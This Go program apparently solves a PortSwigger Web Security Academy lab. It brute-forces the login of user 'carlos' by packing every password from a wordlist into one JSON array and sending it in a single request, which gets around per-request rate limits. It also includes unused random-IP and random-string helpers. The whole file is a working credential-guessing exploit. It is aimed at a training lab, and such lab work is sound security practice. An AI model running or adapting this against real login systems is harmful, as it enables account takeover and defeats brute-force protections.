// https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request

package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/http/httputil"
	"os"
	"strconv"
	"strings"
	"time"
)

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	client, err := newClient()
	if err != nil {
		return err
	}

	u := "https://0a5b001904e33b62c0072c58004c00ab.web-security-academy.net"
	loginUrl := u + "/login"
	username := "carlos"

	passwords, err := passwords()
	if err != nil {
		return err
	}

	_, _, err = login(loginUrl, username, passwords, client)
	return err
}

func passwords() ([]string, error) {
	passwords := make([]string, 0, 1000)

	f, err := os.Open("passwords.txt")
	if err != nil {
		return nil, err
	}
	defer f.Close()

	sc := bufio.NewScanner(f)
	for sc.Scan() {
		passwords = append(passwords, sc.Text())
	}
	return passwords, nil
}

func login(u, username string, passwords []string, client *http.Client) (bool, string, error) {
	postData := make(map[string]interface{})
	postData["username"] = username
	postData["password"] = passwords

	payload, err := json.Marshal(postData)
	if err != nil {
		return false, "", err
	}

	req, err := http.NewRequest("POST", u, strings.NewReader(string(payload)))
	if err != nil {
		return false, "", err
	}
	req.Header.Add("Content-Type", "text/plain;charset=UTF-8")

	dump, err := httputil.DumpRequestOut(req, true)
	if err != nil {
		return false, "", err
	}
	fmt.Printf("%q", dump)

	resp, err := client.Do(req)
	if err != nil {
		return false, "", err
	}
	defer resp.Body.Close()

	//fmt.Println(resp.Status)
	//fmt.Println(resp.Header)

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false, "", err
	}
	b := string(body)
	fmt.Println(b)

	if resp.StatusCode/100 != 2 && resp.StatusCode/100 != 3 {
		return false, b, fmt.Errorf("%v", resp.Status)
	}

	if resp.StatusCode/100 == 3 {
		return true, b, nil
	}

	if strings.Contains(b, "Your username") {
		return true, b, nil
	}
	return false, b, nil
}

func newClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	return &http.Client{Jar: jar}, nil
}

const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

func randString(n int) string {
	rand.Seed(time.Now().UnixNano())
	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}

func randIP() string {
	rand.Seed(time.Now().UnixNano())
	b := &strings.Builder{}
	b.WriteString(strconv.Itoa(rand.Intn(200)))
	b.WriteByte('.')
	b.WriteString(strconv.Itoa(rand.Intn(200)))
	b.WriteByte('.')
	b.WriteString(strconv.Itoa(rand.Intn(200)))
	b.WriteByte('.')
	b.WriteString(strconv.Itoa(rand.Intn(200)))
	return b.String()
}
